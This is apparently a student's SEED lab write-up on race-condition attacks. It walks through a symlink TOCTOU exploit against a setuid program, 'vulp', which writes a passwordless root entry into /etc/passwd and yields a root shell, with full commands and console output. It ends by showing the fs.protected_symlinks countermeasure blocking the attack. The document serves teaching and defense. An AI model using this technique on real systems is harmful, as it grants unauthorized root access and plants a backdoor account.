# Answer in my observation

## Task 1
- When add the following entry to the end of the `/etc/passwd` file:

``` test:U6aMy0wojraho:0:0:test:/root:/bin/bash ```

- We can log in as `root` without typing a password when logging into `test` accout.

```console
[03/28/24]seed@VM:~/.../Labsetup$ su test
Password: 
root@VM:/home/seed/race_cond/Labsetup# whoami
root
```

## Task 2
### Task 2A:
- To add a `root` account to the system. While running the program `vulp` and pausing it in 10 seconds, I will open another terminal and make `/tmp/XYZ` file a symbolic link to `/etc/passwd` immediately. After 10s, I create `test` as a root user.

+ Terminal 1:
```console
[03/28/24]seed@VM:~/.../Labsetup$ ./vulp 
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
No permission 
[03/28/24]seed@VM:~/.../Labsetup$ ./vulp 
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
[03/28/24]seed@VM:~/.../Labsetup$ cat /etc/passwd | grep test
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
[03/28/24]seed@VM:~/.../Labsetup$ su test
Password: 
```

+ Terminal 2:
```console
[03/28/24]seed@VM:~$ ls -ld /tmp/XYZ 
lrwxrwxrwx 1 seed seed 9 Mar 28 12:37 /tmp/XYZ -> /dev/null
[03/28/24]seed@VM:~$ ln -sf /etc/passwd /tmp/XYZ 
[03/28/24]seed@VM:~$ ls -ld /tmp/XYZ
lrwxrwxrwx 1 seed seed 11 Mar 28 12:38 /tmp/XYZ -> /etc/passwd
```

### Task 2B:
- Running the attack file and vulnerable program parallely

```console
[03/29/24]seed@VM:~/.../Labsetup$ ./target_process.sh
[...]
No permission 
No permission 
No permission 
No permission 
No permission 
STOP... The passwd file has been changed
[03/29/24]seed@VM:~/.../Labsetup$ su test
Password:   # Dont have to type password
root@VM:/home/seed/race_cond/Labsetup# 
```

### Task 2C:
- This strategy attack is faster than the previous attack.

## Task 3
### Task 3B:
- This time, I will turn on protection scheme against race condition attacks and using the same race condition attack scenario as Task 2A &rarr; The attack is not successful.

```console
[03/29/24]seed@VM:~/.../Labsetup$ sudo sysctl -w fs.protected_symlinks=1
fs.protected_symlinks = 1
```

```
[03/29/24]seed@VM:~/.../Labsetup$ ./vulp 
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
Segmentation fault
[03/29/24]seed@VM:~/.../Labsetup$ su test
su: user test does not exist
```

- When this protection scheme is set to “1”, symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.

# References:
- https://www.geeksforgeeks.org/ln-command-in-linux-with-examples/
- https://unix.stackexchange.com/questions/81674/what-does-l-mean-in-an-ls-listing
- https://www.kernel.org/doc/html/latest/admin-guide/sysctl/fs.html?highlight=protected_symlinks#protected-symlinks